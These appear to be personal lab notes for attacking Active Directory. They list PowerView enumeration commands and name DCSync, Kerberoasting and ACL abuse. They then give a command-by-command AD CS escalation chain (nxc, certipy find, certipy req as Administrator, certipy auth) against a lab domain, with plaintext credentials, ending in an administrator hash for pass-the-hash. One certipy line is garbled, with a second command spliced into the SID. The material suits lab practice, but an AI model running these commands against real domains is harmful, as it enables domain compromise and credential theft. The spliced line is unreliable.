# Active Directory

## Enumeration

```powershell
Get-NetDomain
Get-NetUser
Get-NetGroup "Domain Admins"
```

## Attack Techniques

- DCSync
- Kerberoasting
- ACL abuse


## See if ACDS is enabled
```
 nxc ldap retro.vl -u "banking$" -p 'pass123!' -M adcs
```

## Review ACDS for misconfigurations.  Review Vulnerabiliteis section at the bottom
```
certipy find -u 'banking$' -p 'pass123!' -dc-ip 10.129.234.44 -vulnerable -stdout
```

## Request Admin Cert  Note the SID used here is for Administrator account.  This will generate .pfx
```
certipy req -u 'banking$' -p 'pass123!' -dc-ip 10.129.234.44 -ca retro-DC-CA -template RetroClients -upn Administrator -target dc.retro.vl -key-size 4096 -sid S-1-5-21-2983547755-698260136-428391certipy-ad find -u 'banking$' -p 'pass123!' -dc-ip 10.129.234.44 -vulnerable -stdout8172-500
```

## Use .PFX to get hash.  Connections could be made with evilwin-rm or brrute forcing could take place once the hash is gathered.  
```
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44 
```

